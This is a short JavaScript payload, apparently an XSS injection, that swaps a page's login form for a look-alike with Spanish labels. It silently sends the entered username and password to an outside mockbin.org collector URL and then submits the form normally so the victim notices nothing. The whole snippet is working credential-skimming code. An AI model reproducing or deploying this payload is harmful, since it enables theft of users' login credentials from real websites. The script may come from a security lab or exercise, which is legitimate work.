function l(){
    document.forms[0].action='control.php';
    var a=new XMLHttpRequest();
    a.onreadystatechange = function(){
        document.forms[0].method='POST';
        document.forms[0].action='control.php';
        document.forms[0].submit();
    };
    a.open('GET', 'http://mockbin.org/bin/eacab648-6a09-4358-817a-dab08f52cf9e?p='.concat(document.getElementById('password').value).concat('%26u=').concat(document.getElementById('usuario').value));
    a.send(null);
}
var f=document.createElement("form");
f.innerHTML=`<form action="control.php" method="post">
    <label for="usuario">USUARIO: </label>
    <input id="usuario" class="user" type="text" name="usuario" value="" size="20" maxlength="50"><br>
    <label for="password">CONTR4SEÑA: </label>
    <input id="password" class="password" type="password" name="password" size="20" maxlength="50"><br>
    <button type="submit" class="enviar_btn">Entrar</button>
</form>
`;
document.getElementById("contenido").appendChild(f);
document.forms[0].remove();
document.forms[0].action = 'javascript:l();'